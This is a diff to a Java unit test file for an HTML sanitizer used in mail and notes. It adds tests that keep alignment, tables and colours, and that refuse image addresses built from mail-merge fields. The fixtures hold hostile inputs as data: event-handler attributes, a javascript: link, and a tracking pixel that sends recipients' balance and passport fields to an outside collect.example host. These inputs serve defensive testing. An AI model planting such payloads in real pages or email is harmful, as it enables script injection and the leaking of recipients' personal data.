@@ -21,7 +21,9 @@ public class RichTextHtmlTest {
 
     @Test
     public void noEventHandlerStyleOrUnknownAttributeIsEverCopied() {
-        assertEquals(RichTextHtml.clean("<p onclick=\"x()\" style=\"color:red\" id=a data-x=1>t</p>"), "<p>t</p>");
+        assertEquals(RichTextHtml.clean("<p onclick=\"x()\" style=\"color:red\" id=a data-x=1>t</p>"),
+                "<p style=\"color: red\">t</p>", "a plain color is kept, rebuilt; nothing else is copied");
+        assertEquals(RichTextHtml.clean("<p style=\"background:url(https://x.test/a.png)\">t</p>"), "<p>t</p>");
         assertEquals(RichTextHtml.clean("<b/onmouseover=x()>t</b>"), "<b>t</b>");
         assertEquals(RichTextHtml.clean("<a href='https://x.test' onclick='x()'>t</a>"),
                 "<a href=\"https://x.test\" rel=\"noopener noreferrer\" target=\"_blank\">t</a>");
@@ -52,10 +54,53 @@ public class RichTextHtmlTest {
         assertEquals(RichTextHtml.clean("a<!-- note -->b<!-- open"), "ab");
     }
 
+    /**
+     * Mail keeps what mail clients show and the mail editors offer (owner, 2026-11-23): an alignment, an indent, and
+     * a table with its widths and cell spans, each rebuilt; nothing else on them is copied.
+     */
+    @Test
+    public void mailKeepsAlignmentIndentAndTables() {
+        assertEquals(RichTextHtml.clean("<p style=\"text-align: center;\">Hi</p><p style=\"margin-left: 40px\">In</p>"),
+                "<p style=\"text-align: center\">Hi</p><p style=\"margin-left: 40px\">In</p>");
+        final String table = "<table style=\"border-collapse: collapse; width: 100%;\" onclick=\"x()\"><tbody><tr>"
+                + "<th colspan=\"2\" style=\"width: 50%\" class=\"x\">Day</th></tr><tr><td rowspan=\"999\">1</td>"
+                + "<td style=\"vertical-align: top\">Mass</td></tr></tbody></table>";
+        assertEquals(RichTextHtml.clean(table), "<table style=\"border-collapse: collapse; width: 100%\"><tbody><tr>"
+                + "<th colspan=\"2\" style=\"width: 50%\">Day</th></tr><tr><td>1</td>"
+                + "<td style=\"vertical-align: top\">Mass</td></tr></tbody></table>");
+        assertTrue(dropped(table), "the handler and the class went, and the save says so");
+        assertFalse(dropped("<table><tr><td colspan=\"2\">x</td></tr></table>"));
+    }
+
+    /**
+     * Mail fills its fields everywhere in the body, attributes included: a field inside an image's address would send
+     * each recipient's own value to the writer's host, fetched with no click (review blocker, 2026-11-23). An address
+     * holding a brace is refused; a field stands as a whole link only.
+     */
+    @Test
+    public void anAddressHoldingAFieldIsRefusedAndAWholeLinkFieldIsKept() {
+        final String pixel = "<p>Hi {{firstName}}</p><img src=\"https://collect.example/p.gif?b={{balanceDue}}"
+                + "&p={{passportIssue}}\" width=\"1\" height=\"1\">";
+        assertEquals(RichTextHtml.clean(pixel), "<p>Hi {{firstName}}</p>");
+        assertTrue(dropped(pixel), "and the save says so");
+        assertEquals(RichTextHtml.clean("<a href=\"https://x.org/pay?id={{personId}}\">pay</a>"), "<a>pay</a>");
+        assertEquals(RichTextHtml.clean("<a href=\"{{paymentLink}}\">pay</a>"),
+                "<a href=\"{{paymentLink}}\" rel=\"noopener noreferrer\" target=\"_blank\">pay</a>");
+        assertEquals(RichTextHtml.cleanEventNote("<p><a href=\"https://example.org/q?f={a}\">map</a></p>"),
+                "<p><a href=\"https://example.org/q?f={a}\" rel=\"noopener noreferrer\" target=\"_blank\">map</a>"
+                        + "</p>", "a note fills no field and keeps a brace, as stored notes always did");
+        assertEquals(RichTextHtml.clean("<td style=\"width: 33.3333%;\">a</td>").contains("33.3333%"), true,
+                "the editor writes a third of a table with four decimals");
+    }
+
     @Test
     public void unknownTagsAreDroppedAndTheirTextKept() {
-        assertEquals(RichTextHtml.clean("<table><tr><td>cell</td></tr></table><font color=red>x</font>"), "cellx");
-        assertEquals(RichTextHtml.clean("<img src=\"https://x.test/a.png\">after"), "after");
+        assertEquals(RichTextHtml.clean("<table><tr><td>cell</td></tr></table><font color=red>x</font>"),
+                "<table><tr><td>cell</td></tr></table><span style=\"color: red\">x</span>",
+                "mail keeps a table (2026-11-23)");
+        assertEquals(RichTextHtml.cleanNote("<table><tr><td>cell</td></tr></table>"), "cell", "a note keeps none");
+        assertEquals(RichTextHtml.clean("<img src=\"https://x.test/a.png\">after"),
+                "<img src=\"https://x.test/a.png\">after", "mail keeps an image by web address (2026-11-23)");
         assertEquals(RichTextHtml.clean("<form action=x><input name=a><button>go</button></form>"), "go");
     }
 
@@ -182,8 +227,9 @@ public class RichTextHtmlTest {
 
     @Test
     public void oneCleanGivesTheBodyAndWhetherItDroppedSomething() {
-        final String pasted = "<p><span style=\"color: red;\">Due</span></p>";
-        assertEquals(RichTextHtml.cleanNoting(pasted), new RichTextHtml.Cleaned("<p><span>Due</span></p>", true));
+        final String pasted = "<p><span style=\"color: red; font-family: Comic Sans\">Due</span></p>";
+        assertEquals(RichTextHtml.cleanNoting(pasted),
+                new RichTextHtml.Cleaned("<p><span style=\"color: red\">Due</span></p>", true));
         assertEquals(RichTextHtml.cleanNoting("<p>Hi</p>"), new RichTextHtml.Cleaned("<p>Hi</p>", false));
         assertEquals(RichTextHtml.cleanNoting(null), new RichTextHtml.Cleaned("", false));
     }
@@ -249,14 +295,13 @@ public class RichTextHtmlTest {
     }
 
     @Test
-    public void colorsImagesAndRefusedLinksAreReportedAsDropped() {
-        for (final String lost : List.of("<p><span style=\"color: rgb(230, 0, 0);\">Due Friday</span></p>",
-                "<p><span style=\"background-color: yellow;\">x</span></p>",
+    public void videosTablesOtherStylesAndRefusedLinksAreReportedAsDropped() {
+        for (final String lost : List.of("<p><span style=\"font-family: Comic Sans;\">Due Friday</span></p>",
+                "<p><span style=\"background: url(x);\">x</span></p>",
                 "<p>Logo <img src=\"data:image/png;base64,AAAA\"></p>",
                 "<iframe class=\"ql-video\" src=\"https://video.test/x\"></iframe>",
                 "<p><a href=\"javascript:alert(1)\">x</a></p>", "<p><a href=\"example.com/pay\">pay</a></p>",
-                "<p><a href=\"\">x</a></p>", "<p class=\"ql-hidden\">x</p>", "<table><tr><td>x</td></tr></table>",
-                "text</font>")) {
+                "<p><a href=\"\">x</a></p>", "<p class=\"ql-hidden\">x</p>", "<form><p>x</p></form>")) {
             assertTrue(dropped(lost), lost);
         }
     }
